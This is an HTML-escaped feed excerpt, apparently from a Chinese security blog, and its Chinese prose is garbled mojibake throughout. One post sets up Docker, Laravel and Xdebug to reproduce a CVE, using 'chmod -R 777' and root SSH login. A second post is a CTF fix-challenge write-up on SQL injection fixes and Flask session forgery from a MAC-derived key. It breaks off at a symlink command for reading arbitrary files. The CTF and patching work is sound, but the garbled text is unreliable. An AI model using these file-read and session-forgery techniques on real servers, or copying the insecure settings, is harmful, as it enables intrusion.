&lt;p>å…ˆè¯´ä¸‹æœ¬æ¬¡é…ç½®çš„çŽ¯å¢ƒæ•´ä½“éœ€æ±‚å§ï¼š&lt;/p>
&lt;ul>
&lt;li>è¿œç¨‹vpsçš„docker(FROM php:7.4-apache): éœ€å¼€æ”¾webé¡µé¢ç«¯å£ + sshç«¯å£ï¼ˆæ— éœ€æŒ‚è½½ç›®å½•&lt;/li>
&lt;li>laravel 8.4.2, laravel/framework 8.22.1, facade/ignition 2.5.1&lt;/li>
&lt;li>æœ¬åœ°ide: PHPStorm + ä¸€ä¸ªæ˜ å°„åˆ°å…¬ç½‘ipçš„ä¾›è°ƒè¯•è¿žæŽ¥ä½¿ç”¨çš„ç«¯å£ï¼ˆåŽé¢ä¼šè§£é‡ŠåŽŸå› ï¼‰&lt;/li>
&lt;/ul>
&lt;p>é™¤äº†æœ€åŽçš„laravelä¹‹å¤–å°±éƒ½æ˜¯è°ƒphpçš„é€šç”¨æµç¨‹å•¦ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§~&lt;/p>
&lt;h2 id="è¿œç¨‹dockerlaravelçš„çŽ¯å¢ƒæ­å»º">è¿œç¨‹docker&amp;amp;laravelçš„çŽ¯å¢ƒæ­å»º&lt;/h2>
&lt;p>ä»¥php:7.4-apacheé•œåƒä½œä¸ºåŸºç¡€è¿›è¡Œåˆ›å»ºï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯portainerï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆä¸å†™dockerfileï¼Œé—®å°±æ˜¯è¿˜åœ¨å­¦ç€æ€Žä¹ˆå†™ï¼ˆä¸€å®šä¸é¸½ è¿‘æœŸä¼šæ›´æ–°åˆ°è¿™é‡Œçš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125164513693.png" alt="image-20211125164513693">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">apt update
apt-get install -y ssh git unzip
vim /etc/ssh/sshd_config &lt;span style="color:#75715e"># å¼€å¯å¯¹åº”é€‰é¡¹ æ¯”å¦‚å…è®¸rootè¿žæŽ¥ä»€ä¹ˆçš„ ä¸ç”¨æˆ‘ç»†å—¦ å„ä½å¸¦æ‰‹å­ä»¬éƒ½åº”è¯¥æ‡‚&lt;/span>
pecl install xdebug
touch /var/log/php/xdebug_remote.log &lt;span style="color:#75715e"># å¦‚æžœéœ€è¦logçš„è¯è¦æå‰åˆ›å»ºå¥½å™¢&lt;/span>
vim /usr/local/etc/php/php.ini &lt;span style="color:#75715e"># å°†ä¸‹é¢æ¡†ä¸­å†…å®¹ç²˜åˆ°æœ«å°¾å³å¯&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#00a8c8">[Xdebug]&lt;/span>
&lt;span style="color:#75715e">; è¿™ä¸€é¡¹å®‰è£…å¥½ä¹‹åŽä¼šæœ‰æç¤º&lt;/span>
&lt;span style="color:#75af00">zend_extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so&amp;#34;&lt;/span>
&lt;span style="color:#75af00">xdebug.mode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">debug&lt;/span>
&lt;span style="color:#75af00">xdebug.client_host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">your_vps&lt;/span>
&lt;span style="color:#75af00">xdebug.client_port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">port&lt;/span>
&lt;span style="color:#75af00">xdebug.idekey&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">laravel&lt;/span>
&lt;span style="color:#75af00">xdebug.remote_handler&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;dbgp&amp;#34;&lt;/span>
&lt;span style="color:#75af00">xdebug.log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/var/log/php/xdebug_remote.log&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ­¤å¤„å®‰è£…ç‰ˆæœ¬ä¸ºxdebug3ï¼Œä¸Žxdebug2çš„é…ç½®è¯­æ³•æœ‰ä¸€äº›å‡ºå…¥ï¼Œå…·ä½“æ›´æ–°çš„å†…å®¹è¯¦è§&lt;a href="https://xdebug.org/docs/upgrade_guide">æ›´æ–°æ–‡æ¡£&lt;/a>ï¼Œå®‰è£…å¥½xdebugåŽæ‰§è¡Œ&lt;code>php -v&lt;/code>å‘½ä»¤ä¼šæœ‰æ˜¾ç¤ºç‰ˆæœ¬&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125164949111.png" alt="image-20211125164949111">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">wget https://github.com/composer/composer/releases/download/2.1.12/composer.phar
mv composer.phar /usr/local/bin/composer
chmod +x /usr/local/bin/composer
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#111">cd&lt;/span> /var/www
composer create-project laravel/laravel . &lt;span style="color:#d88200">&amp;#34;v8.4.2&amp;#34;&lt;/span>
vim composer.json &lt;span style="color:#75715e"># ä¿®æ”¹å†…å®¹è§ä¸‹&lt;/span>
composer update
mv public html
chmod -R &lt;span style="color:#ae81ff">777&lt;/span> /var/www
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">&amp;#34;laravel/framework&amp;#34;: &amp;#34;8.22.1&amp;#34;&lt;/span>
&lt;span style="color:#75af00">&amp;#34;facade/ignition&amp;#34;: &amp;#34;2.5.1&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€ä¸ªå‘ç‚¹ï¼šå³ä½¿æŒ‡å®šäº†&lt;a href="laravel/laravel">laravel/laravel&lt;/a>ç‰ˆæœ¬ï¼Œcomposeråˆ›å»ºé»˜è®¤ä¼šä½¿ç”¨æœ€æ–°çš„&lt;a href="laravel/framework">laravel/framework&lt;/a>ç‰ˆæœ¬&amp;amp;ç›¸å…³ç»„ä»¶ä¾èµ–ï¼ˆæ¯”å¦‚çŽ°åœ¨æ˜¯8.73.2ï¼‰ï¼Œç”±äºŽæˆ‘ä»¬éœ€è¦å¤çŽ°çš„cveæœ‰ç‰¹æ®Šçš„laravelç»„ä»¶ç‰ˆæœ¬éœ€æ±‚ï¼Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å•ç‹¬å¯¹composer.jsonè¿›è¡Œä¿®æ”¹ï¼Œç„¶åŽæ‰§è¡Œ&lt;code>composer update&lt;/code>è¿›è¡Œæ›´æ–°&lt;/p>
&lt;p>ä¸€åˆ‡é¡ºåˆ©çš„è¯è®¿é—®webé¡µé¢å°±å¯ä»¥çœ‹åˆ°laravelå•¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125165355843.png" alt="image-20211125165355843">&lt;/p>
&lt;h2 id="ä¸Žæœ¬åœ°çš„phpstormè¿žæŽ¥èµ·æ¥è¿›è¡Œdebug">ä¸Žæœ¬åœ°çš„PHPStormè¿žæŽ¥èµ·æ¥è¿›è¡Œdebug&lt;/h2>
&lt;p>å¼€å§‹ä¹‹å‰å…ˆè‡ªé—®è‡ªç­”ä¸€ä¸‹ï¼šä¸ºä»€ä¹ˆè°ƒè¯•è¦ä¸€ä¸ªèƒ½æ˜ å°„åˆ°å…¬ç½‘çš„ç«¯å£ï¼Ÿ&lt;/p>
&lt;p>PHPStormä¸­é›†æˆäº†éµå¾ªDBGpåè®®çš„Xdebugæ’ä»¶ï¼Œå½“å¼€å¯ç›‘å¬æ—¶ä¼šç›‘å¬æœ¬åœ°æŒ‡å®šç«¯å£ï¼Œå½“è®¿é—®æŒ‡å®šserverçš„webé¡µé¢å¹¶å¸¦æœ‰å«æœ‰ide_keyçš„ç‰¹å®šcookieå‚æ•°ä¹‹åŽï¼ŒXdebugä¼šæŽ¥æ”¶åˆ°è¿™ä¸ªå‚æ•°å¹¶å¼€å¯debugï¼Œé€šè¿‡DBGpåè®®å‘php.iniä¸­æŒ‡å®šçš„ip&amp;amp;portå‘é€è¯·æ±‚ï¼Œå½“è¿™ä¸ªportæŒ‡å‘æˆ‘ä»¬ideåœ¨ç›‘å¬çš„ç«¯å£æ—¶ï¼Œå°±ä¼šå»ºç«‹èµ·Xdebugå’Œideçš„è¿žæŽ¥ï¼ˆä½¿ç”¨DBGpåè®®é€šè®¯ï¼‰ï¼ŒéšåŽå®ƒä»¬ä¹‹é—´è¿›è¡Œæ•°æ®äº¤äº’ï¼Œå¦‚æ­¤åå¤ï¼›æ›´è¯¦ç»†çš„å†…å®¹è¯·å‚è§-&amp;gt;&lt;a href="https://xdebug.org/docs/dbgp#id32">6.3 IDE to debugger engine communications&lt;/a>&lt;/p>
&lt;p>è¿™ä¸‹å°±å¥½ç†è§£äº†å­ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œéœ€è¦ä¸€ä¸ªä¸Žè¿œç¨‹ä»£ç è¿è¡ŒçŽ¯å¢ƒå¤„åœ¨åŒä¸€ä¸ªç½‘æ®µä¸‹çš„ç«¯å£ï¼ˆå…¬ç½‘çš„æ›´å¥½ï¼‰ï¼›æŽ¥ä¸‹æ¥å°±æ˜¯é…ç½®å•¦&lt;/p>
&lt;h3 id="å†…ç½‘ç©¿é€">å†…ç½‘ç©¿é€&lt;/h3>
&lt;p>å†…ç½‘ç©¿é€æˆ‘ä½¿ç”¨çš„æ˜¯npsï¼Œé…ç½®è¿‡ç¨‹å¯ä»¥å‚è€ƒ&lt;a href="https://ehang-io.github.io/nps/#/run">å®˜æ–¹æ–‡æ¡£&lt;/a>ï¼Œç”±äºŽæˆ‘è¿™é‡Œé…çš„æ¯”è¾ƒæ—© è¿™éƒ¨åˆ†è·³è¿‡&lt;/p>
&lt;h3 id="phpstormçš„è®¾ç½®æœ‰ä¸€å †">PHPStormçš„è®¾ç½®æœ‰ä¸€å †&lt;/h3>
&lt;p>æŠŠdockerä¸­/wwwç›®å½•æ‰“åŒ…æ‹–ä¸‹æ¥ï¼Œç”¨PHPStormæ‰“å¼€&lt;/p>
&lt;h4 id="è®¾ç½®debug">è®¾ç½®Debug&lt;/h4>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125172830540.png" alt="image-20211125172830540">&lt;/p>
&lt;p>20007æ˜¯æœ¬åœ°ç«¯å£ï¼Œè¢«æ˜ å°„åˆ°å…¬ç½‘ip&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125172903465.png" alt="image-20211125172903465">&lt;/p>
&lt;p>è¿™é‡Œçš„20007æ˜¯å…¬ç½‘ç«¯å£ï¼Œä»£ç†æœ¬åœ°çš„20007&lt;/p>
&lt;p>å¦‚æžœæˆ‘è®²æ¸…æ¥šå‰é¢åŽŸç†çš„è¯ï¼Œå¤§å®¶åº”è¯¥èƒ½ç†è§£è¿™ä¸¤ä¸ªåœ°æ–¹çš„ç«¯å£è®¾ç½®äºŒé€‰ä¸€å³å¯&lt;/p>
&lt;h4 id="è®¾ç½®deployment">è®¾ç½®Deployment&lt;/h4>
&lt;p>ç”¨SFTPä¸Ždockerè¿›è¡Œsshè¿žæŽ¥ï¼Œæ–‡ä»¶æ˜ å°„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174439189.png" alt="image-20211125174439189">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174449223.png" alt="image-20211125174449223">&lt;/p>
&lt;h4 id="è®¾ç½®è¿œç¨‹phpè§£é‡Šå™¨">è®¾ç½®è¿œç¨‹phpè§£é‡Šå™¨&lt;/h4>
&lt;p>é€‰æ‹©sshæ¨¡å¼ï¼Œé…ä¸€ä¸‹è´¦å·å¯†ç ç«¯å£å°±è¡Œï¼ˆè‡³äºŽä¸ºä»€ä¹ˆä¸ç”¨docker/docker-composeï¼Œä¹‹åŽä¼šè¯´ï¼‰ï¼Œè¿™é‡Œçš„Path mappingsç›´æŽ¥å°±æ˜¯Deploymentä¸­é…å¥½çš„ï¼Œå¯ä»¥å•ç‹¬å†åŠ ï¼Œä½†æ˜¯æ²¡å¿…è¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125173731219.png" alt="image-20211125173731219">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174004041.png" alt="image-20211125174004041">&lt;/p>
&lt;h4 id="è®¾ç½®server">è®¾ç½®Server&lt;/h4>
&lt;p>æ³¨æ„é«˜äº®åœ°æ–¹çš„è®¾ç½®ï¼Œæ˜¯webé¡µé¢çš„ç«¯å£ï¼Œä¹Ÿè¦è®¾ç½®å¥½æœ¬åœ°çš„è·¯å¾„æ˜ å°„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125173454167.png" alt="image-20211125173454167">&lt;/p>
&lt;h3 id="éªŒè¯ä¸€ä¸‹è”é€šæƒ…å†µ">éªŒè¯ä¸€ä¸‹è”é€šæƒ…å†µ&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125175835232.png" alt="image-20211125175835232">&lt;/p>
&lt;p>å¥½è€¶~&lt;/p>
&lt;h3 id="æµè§ˆå™¨æ’ä»¶xdebug-helper">æµè§ˆå™¨æ’ä»¶Xdebug helper&lt;/h3>
&lt;p>è®¾ç½®Debug Configurationï¼Œé€‰PHP Remote Debugæ¨¡å¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125175154353.png" alt="image-20211125175154353">&lt;/p>
&lt;p>å®‰è£…æ’ä»¶ï¼Œè®¾ç½®ide_keyï¼Œå¼€å¯å°è™«å­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180035074.png" alt="image-20211125180035074">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180424620.png" alt="image-20211125180424620">&lt;/p>
&lt;h2 id="ç»ˆäºŽå®Œäº†">ç»ˆäºŽå®Œäº†&lt;/h2>
&lt;p>éšä¾¿æ‰“ä¸ªæ–­ç‚¹ï¼Œå¼€å¯æœ¬åœ°ç›‘å¬&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180223037.png" alt="image-20211125180223037">&lt;/p>
&lt;p>åˆ·æ–°é¡µé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180453865.png" alt="image-20211125180453865">&lt;/p>
&lt;p>èŠœæ¹–èµ·é£žï¼&lt;/p>
&lt;h2 id="å¾…å®Œå–„çš„åœ°æ–¹">***å¾…å®Œå–„çš„åœ°æ–¹&lt;/h2>
&lt;ul>
&lt;li>é…ç½®è¿œç¨‹phpè§£é‡Šå™¨å¯ä»¥ä½¿ç”¨docker/docker-composeï¼Œè¿™ä¸¤ä¸ªéƒ½éœ€è¦å•ç‹¬æŒ‚è½½å…³é”®ç›®å½•å‡ºæ¥ï¼Œé…ç½®ä¸Šä¸Žsshçš„åŒºåˆ«è¿˜æ˜¯æœ‰ç‚¹å¤§çš„ï¼Œä¹Ÿéœ€è¦æ³¨æ„docker-composeæ–‡ä»¶çš„ç¼–å†™ï¼Œå…ˆæ‰”ä¸€ä¸ªå‚è€ƒèµ„æ–™-&amp;gt;&lt;a href="https://www.pascallandau.com/blog/setup-phpstorm-with-xdebug-on-docker/#setup-the-docker-containers">Setting up PhpStorm with Xdebug for local development on Docker &amp;hellip; natively and via Deployment Configuration.&lt;/a>&lt;/li>
&lt;li>å…³äºŽdockerfile/docker-composeæ–‡ä»¶çš„ç¼–å†™ï¼Œæˆ‘è¿˜ä¸æ˜¯å¾ˆç†Ÿç»ƒï¼Œè·Ÿä¸ç”¨è¯´è¿™æ ·çš„phpé¡¹ç›®äº†ï¼ŒåŒæ ·å…ˆæ‰”ä¸€ä¸ªå‚è€ƒèµ„æ–™-&amp;gt;&lt;a href="https://www.pascallandau.com/blog/structuring-the-docker-setup-for-php-projects/">Structuring the Docker setup for PHP Projects &amp;hellip; folder structure, Dockerfile templates and general fundamentals&lt;/a>&lt;/li>
&lt;li>PHPStormæœ‰å†…ç½®çš„dockerç®¡ç†åŠŸèƒ½ï¼Œå¯ä»¥åˆ›å»ºé•œåƒ-&amp;gt;é…ç½®debugä¸€æ­¥åˆ°ä½&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>è™½ç„¶è¸©äº†å¾ˆå¤šå‘ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ï¼Œå¸Œæœ›èƒ½å¤šå°‘å¸®åŠ©ä¸€äº›äººå°‘èµ°å¼¯è·¯ï¼ˆ&lt;/p>
&lt;p>é™äºŽç¯‡å¹…åŽŸå› ï¼Œä»£ç å®¡è®¡çš„éƒ¨åˆ†å°±æ”¾åˆ°åŽé¢å•¦~&lt;/p>
&lt;p>æœ€è¿‘æ›´æ–°çš„ä¸å¤ªå‹¤å¿«ï¼Œæˆ‘å…ˆè‡ªæˆ‘æ‰¹è¯„TATï¼Œå·²ç»å¾ˆèœäº†ä¸èƒ½å†ä¸åŠªåŠ›å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Š&lt;/p></description></item><item><title>buuojåŠ å›ºé¢˜ Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuojæ–°ä¸Šäº†åŠ å›ºé¢˜è¿™ä¸ªåˆ†ç±»ï¼Œä¹Ÿå°±æ˜¯çº¿ä¸‹awdpä¸­fixçš„éƒ¨åˆ†ï¼Œåªè¦å°†é¶æœºä¸­å­˜åœ¨çš„æ¼æ´žä¿®å¤å¥½å¹¶é€šè¿‡checkçš„æ£€æµ‹å³å¯æ‹¿åˆ°flagï¼›æœ‰ä¸€è¯´ä¸€ï¼Œæ¯”å•çº¯attackæ‹¿flagä¼šç®€å•å¾ˆå¤šï¼ˆé€‚åˆæˆ‘è¿™ç§æ²¸ç‰©web&lt;/p>
&lt;p>ä¸‹é¢çš„wpä¼šå…ˆè¯´çº¯ä¿®å¤è§’åº¦ï¼Œå†ä¸²ä¸€ä¸‹æ•´ä½“çš„çŸ¥è¯†ç‚¹ï¼›å› ä¸ºè‡ªå·±æ°´å¹³æœ‰é™ï¼Œæƒ³å°½å¯èƒ½è¯´çš„æ¸…æ¥šä¸€äº›å°±ä¼šæ¯”è¾ƒå•°å—¦ï¼Œè§è°…QAQ&lt;/p>
&lt;h2 id="ezsql">Ezsql&lt;/h2>
&lt;h3 id="fix">FIX&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083450780.png" alt="image-20211107083450780">&lt;/p>
&lt;p>200è¡Œï¼Œå¤ªå…¸äº†ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°å®Œå…¨æ²¡æœ‰æ£€æµ‹ï¼Œæ˜¯ä¸ªç­›å­ï¼›ç”¨é¢„å¤„ç†çš„æ–¹å¼ä¿®ï¼Œåˆå¯ä»¥åˆ†ä¸ºä¸¤ç§å½¢å¼&lt;/p>
&lt;h3 id="mysqlé¢„å¤„ç†">mysqlé¢„å¤„ç†&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083655664.png" alt="image-20211107083655664">&lt;/p>
&lt;p>å…¶ä¸­201è¡Œçš„&lt;code>ss&lt;/code>æŒ‡çš„æ˜¯ç»‘å®šSQLå‚æ•°çš„ç±»åž‹ä¸ºstringï¼Œè¿™ä¸€é¡¹å¿…ä¸å¯å°‘è€Œä¸”å¿…é¡»ä¸ŽåŽé¢çš„å‚æ•°ä¸€ä¸€å¯¹åº”&lt;/p>
&lt;h3 id="pdoé¢„å¤„ç†">PDOé¢„å¤„ç†&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107084309239.png" alt="image-20211107084309239">&lt;/p>
&lt;p>PDOé¢„å¤„ç†å±žäºŽæ˜¯é€šé˜²äº†ï¼Œèƒ½æœ‰æ•ˆåœ°åº”å¯¹sqliç‰¹åˆ«æ˜¯å †å æ³¨å…¥ï¼Œ208è¡Œçš„è®¾ç½®é¡¹æ„ä¸ºç¦ç”¨æ¨¡æ‹Ÿé¢„å¤„ç†&lt;/p>
&lt;h2 id="ciscn2021-æ€»å†³èµ›babypython">[CISCN2021 æ€»å†³èµ›]babypython&lt;/h2>
&lt;h3 id="fix-1">FIX&lt;/h3>
&lt;p>sshè¿žä¸ŠåŽçœ‹ä¸‹ç›®å½•ç»“æž„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212456961.png" alt="image-20211106212456961">&lt;/p>
&lt;p>æŸ¥çœ‹/app/y0u_found_it/y0u_found_it_main.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212556547.png" alt="image-20211106212556547">&lt;/p>
&lt;p>11è¡Œè¿™ä¸æ˜¯å…¸ä¸­å…¸äº†ï¼Ÿè¯»macåœ°å€å°±æ‰“é€šäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æŽ¥æŠŠSECRET_KEYæ”¹ä¸ºä¸€ä¸ªåˆé•¿åˆä¹±çš„éšæœºå­—ç¬¦ä¸²å³å¯ï¼Œå¯ä»¥ä½¿ç”¨&lt;a href="uuid/guid%E7%94%9F%E6%88%90%E5%99%A8">uuid/guidç”Ÿæˆå™¨&lt;/a>æ¥ç”Ÿæˆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106210732859.png" alt="image-20211106210732859">&lt;/p>
&lt;blockquote>
&lt;p>â€”â€”â€”â€”ç¢Žç¢Žå¿µï¼šè¿™é‡Œä¿®å¤çš„æ—¶å€™å¯èƒ½çœ‹è„¸ï¼Ÿæˆ‘åœ¨å‡ å¤©å‰è¯•çš„æ—¶å€™ç”¨çš„ä¸€æ¨¡ä¸€æ ·çš„æ–¹æ³•ï¼Œä½†æ˜¯æ€Žä¹ˆéƒ½ä¸èƒ½è¿‡checkï¼Œä»Šå¤©è¯•äº†ä¸€æ¬¡å°±å¯ä»¥äº†ï¼Œä½†æ˜¯åœ¨å†™wpçš„æ—¶å€™å†å¤ç›˜å°±åˆä¸å¯ä»¥äº†â€¦â€¦emmm å¯èƒ½è¿˜æ˜¯å“ªé‡Œçš„ç»†èŠ‚å‡ºäº†é”™ä½†æ˜¯æˆ‘æ²¡æœ‰æ³¨æ„åˆ°ï¼Ÿç»™æˆ‘æ•´ä¸ä¼šäº†å±žäºŽæ˜¯&lt;/p>
&lt;/blockquote>
&lt;h3 id="å…³äºŽæœ¬é¢˜">å…³äºŽæœ¬é¢˜&lt;/h3>
&lt;p>æ˜¯ä¸ªåŽŸé¢˜ï¼Œè¿˜æ˜¯ä¸ªæœ‰äº†åŒ…æµ†çš„åŽŸé¢˜ï¼Œå‚è§-&amp;gt;&lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BHCTF%202018%5DHideandseek">[HCTF 2018]Hideandseek&lt;/a>&lt;/strong> | &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb3">[SWPU2019]Web3&lt;/a>&lt;/strong>ï¼Œåšè¿‡çš„å°±çŸ¥é“è¿™ä»–å¦ˆçœŸçš„å°±ä¸€æ¨¡ä¸€æ ·hhhhhhhh&lt;/p>
&lt;p>è€ƒç‚¹åœ¨äºŽlinuxè½¯é“¾æŽ¥+uuid+flask-sessionä¼ªé€ ï¼ŒåŽè€…è¿˜ç»å¸¸å•ç‹¬å‡ºé¢˜ï¼Œæ¯”å¦‚ &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 åŽä¸œå—èµ›åŒº]Web4&lt;/a>&lt;/strong>ï¼Œéƒ½å¿«çƒ¤çƒ‚äº†&lt;/p>
&lt;h3 id="è€ƒç‚¹ä¸€--uuidsecret_key">è€ƒç‚¹ä¸€ Â· uuid&amp;amp;SECRET_KEY&lt;/h3>
&lt;p>SECRET_KEYé€šè¿‡uuid+ä¼ªéšæœºæ•°çš„æ–¹å¼ç”Ÿæˆï¼Œè¿™ä¸ªè€ƒç‚¹å¯ä»¥å‚è€ƒ &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 åŽä¸œå—èµ›åŒº]Web4&lt;/a>&lt;/strong>ï¼Œå…¶ä¸­app.pyæ˜¯è¿™æ ·å†™çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212834438.png" alt="image-20211106212834438">&lt;/p>
&lt;p>&lt;code>uuid.getnode()&lt;/code>ä¼šä»¥48ä½äºŒè¿›åˆ¶é•¿åº¦çš„æ­£æ•´æ•°å½¢å¼è¿”å›žmacåœ°å€ï¼Œlinuxä¸‹macåœ°å€çš„ä½ç½®åœ¨&lt;code>/sys/class/net/eth0/address&lt;/code>ï¼Œè¯»å‡ºmacåœ°å€åŽæˆ‘ä»¬ä¹Ÿæ¥ç”Ÿæˆä¸€æ³¢ä¼ªéšæœºæ•°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204313712.png" alt="image-20210707204313712">&lt;/p>
&lt;p>ä¹‹åŽé€šè¿‡flask-session-cookie-managerä¸€æŠŠæ¢­å³å¯ä¼ªé€ sessionå€¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204240633.png" alt="image-20210707204240633">&lt;/p>
&lt;p>â€”â€”â€”â€”å¦å¤–ï¼Œé€šå¸¸è®¿é—®ä¸å­˜åœ¨ç›®å½•æ—¶SECRET_KEYä¼šå‡ºçŽ°åœ¨è¯·æ±‚å¤´ä¸­&lt;/p>
&lt;h3 id="è€ƒç‚¹äºŒ--linuxè½¯é“¾æŽ¥æ–‡ä»¶è¯»å–zipåŽ‹ç¼©åŒ…">è€ƒç‚¹äºŒ Â· linuxè½¯é“¾æŽ¥æ–‡ä»¶è¯»å–&amp;amp;zipåŽ‹ç¼©åŒ…&lt;/h3>
&lt;p>ln -sæ˜¯linuxä¸­çš„è½¯é“¾æŽ¥å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶ä½œå¯¹åº”æ–‡ä»¶çš„ç»å¯¹è·¯å¾„çš„è½¯é“¾æŽ¥æ¥è¯»æ–‡ä»¶ï¼›å½“ä¸çŸ¥é“flaskå·¥ä½œç›®å½•å¯ä»¥ä½¿ç”¨&lt;code>/proc/self/cwd&lt;/code>æ¥æŒ‡å‘å½“å‰è¿›ç¨‹çš„ç›®å½•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/cwd/flag/flag/.jpg qwe
